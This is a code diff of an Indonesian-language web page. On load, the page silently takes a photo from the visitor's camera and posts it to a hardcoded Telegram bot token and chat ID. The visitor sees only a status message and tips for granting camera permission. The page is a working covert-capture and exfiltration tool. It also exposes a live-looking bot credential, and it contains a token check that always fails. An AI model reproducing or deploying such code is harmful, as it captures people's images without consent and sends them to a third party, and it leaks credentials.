@@ -1,47 +1,189 @@
-<script>
-  const video = document.getElementById('camera-view');
-  const canvas = document.getElementById('camera-canvas');
-  const photoResult = document.getElementById('photo-result');
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture Foto ke Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: white;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        #status {
+            margin-top: 50px;
+            font-size: 18px;
+            color: #333;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        #permission-help {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 20px auto;
+            max-width: 500px;
+            border-radius: 5px;
+            display: none;
+        }
+        button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Auto Capture Foto ke Telegram</h1>
+    
+    <div id="status">Memulai proses...</div>
+    
+    <div id="permission-help">
+        <h3>Panduan Izin Kamera</h3>
+        <p>1. Klik ikon kamera/gembok di address bar browser</p>
+        <p>2. Pilih "Izinkan" untuk akses kamera</p>
+        <p>3. Refresh halaman setelah memberikan izin</p>
+        <button id="retry-btn">Coba Lagi</button>
+    </div>
 
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
-    })
-    .catch(error => {
-      console.error('Gagal akses kamera:', error);
-      alert('Tidak dapat mengakses kamera.');
-    });
-
-  function takePhoto() {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL('image/png');
-    photoResult.src = imageData;
-    photoResult.style.display = 'block';
-
-    // Kirim ke Telegram
-    const token = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
-    const chatId = '7041008009';
-
-    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-      method: 'POST',
-      body: JSON.stringify({
-        chat_id: chatId,
-        photo: imageData,
-        caption: "Foto dari Web App"
-      }),
-      headers: {
-        'Content-Type': 'application/json'
-      }
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log('Berhasil kirim:', data);
-    })
-    .catch(error => {
-      console.error('Gagal kirim ke Telegram:', error);
-    });
-  }
-</script>
+    <script>
+        // ================= CONFIGURASI =================
+        const BOT_TOKEN = '7548364986:AAGhlDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
+        const CHAT_ID = '7041008009';
+        // ================================================
+        
+        // Elemen UI
+        const statusEl = document.getElementById('status');
+        const permissionHelpEl = document.getElementById('permission-help');
+        const retryBtn = document.getElementById('retry-btn');
+        
+        // Fungsi utama
+        async function initialize() {
+            try {
+                // 1. Cek koneksi internet
+                if (!navigator.onLine) {
+                    throw new Error("Tidak ada koneksi internet");
+                }
+                
+                // 2. Cek token dan chat ID
+                if (!BOT_TOKEN || !BOT_TOKEN.startsWith('bot') || !CHAT_ID) {
+                    throw new Error("Konfigurasi Telegram tidak valid");
+                }
+                
+                // 3. Ambil foto
+                statusEl.textContent = "Mengakses kamera...";
+                const photoDataUrl = await capturePhoto();
+                
+                // 4. Kirim ke Telegram
+                statusEl.textContent = "Mengirim foto ke Telegram...";
+                await sendToTelegram(photoDataUrl);
+                
+                statusEl.textContent = "✅ Foto berhasil dikirim ke Telegram!";
+                statusEl.style.background = "#e6f7e6";
+                
+            } catch (error) {
+                statusEl.textContent = "❌ Error: " + error.message;
+                statusEl.style.background = "#ffebee";
+                
+                if (error.message.includes("kamera")) {
+                    permissionHelpEl.style.display = 'block';
+                }
+                
+                console.error("Error details:", error);
+            }
+        }
+        
+        // Fungsi ambil foto
+        async function capturePhoto() {
+            try {
+                // Cek izin kamera terlebih dahulu
+                if (navigator.permissions) {
+                    const cameraPermission = await navigator.permissions.query({name: 'camera'});
+                    if (cameraPermission.state === 'denied') {
+                        throw new Error("Izin kamera ditolak. Silakan izinkan akses kamera.");
+                    }
+                }
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.autoplay = true;
+                video.playsInline = true;
+                
+                // Tunggu kamera siap
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        setTimeout(resolve, 500); // Biarkan kamera fokus
+                    };
+                });
+                
+                // Ambil foto
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Stop kamera
+                stream.getTracks().forEach(track => track.stop());
+                
+                return canvas.toDataURL('image/jpeg', 0.8);
+                
+            } catch (error) {
+                throw new Error("Gagal mengambil foto: " + error.message);
+            }
+        }
+        
+        // Fungsi kirim ke Telegram
+        async function sendToTelegram(photoDataUrl) {
+            try {
+                // Konversi data URL ke blob
+                const blob = await (await fetch(photoDataUrl)).blob();
+                const formData = new FormData();
+                
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', `Foto otomatis\nWaktu: ${new Date().toLocaleString()}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (!result.ok) {
+                    throw new Error(result.description || "Gagal mengirim ke Telegram");
+                }
+                
+                return result;
+                
+            } catch (error) {
+                throw new Error("Gagal mengirim ke Telegram: " + error.message);
+            }
+        }
+        
+        // Event listeners
+        retryBtn.addEventListener('click', () => {
+            permissionHelpEl.style.display = 'none';
+            initialize();
+        });
+        
+        // Start process
+        window.addEventListener('DOMContentLoaded', initialize);
+    </script>
+</body>
+</html>
